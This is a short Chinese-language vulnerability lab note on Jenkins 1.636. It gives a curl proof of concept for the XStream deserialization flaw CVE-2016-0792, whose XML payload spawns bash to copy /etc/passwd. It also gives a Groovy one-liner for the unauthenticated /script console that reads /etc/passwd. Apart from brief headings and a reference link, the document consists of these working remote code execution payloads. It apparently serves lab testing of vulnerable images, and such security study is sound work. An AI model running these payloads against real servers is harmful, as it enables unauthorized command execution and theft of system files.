## CVE-2016-0792 - XStream 反序列化漏洞

测试镜像

* src/jenkins/1.636/

参考文档

* [Jenkins - XStream Groovy classpath Deserialization (Metasploit)](https://www.exploit-db.com/exploits/43375/)

Poc

```
# 复制 /etc/passwd 到 /tmp
curl 'http://127.0.0.1/createItem?name=boh3ti8AGh' --data-binary '<map><entry><groovy.util.Expando><expandoProperties><entry><string>hashCode</string><org.codehaus.groovy.runtime.MethodClosure><delegate class="groovy.util.Expando"reference="../../../.."/><owner class="java.lang.ProcessBuilder"><command><string>/bin/bash</string><string>-c</string><string>cp /etc/passwd /tmp</string></command><redirectErrorStream>false</redirectErrorStream></owner><resolveStrategy>0</resolveStrategy><directive>0</directive><parameterTypes/><maximumNumberOfParameters>0</maximumNumberOfParameters><method>start</method></org.codehaus.groovy.runtime.MethodClosure></entry></expandoProperties></groovy.util.Expando><int>1</int></entry></map>' -H 'Content-Type: application/xml'
```

## 运维安全 - /script 无认证

测试镜像

* src/jenkins/1.636/

访问 /script，执行如下内容

```
println "cat /etc/passwd 2>&1".execute().text
```

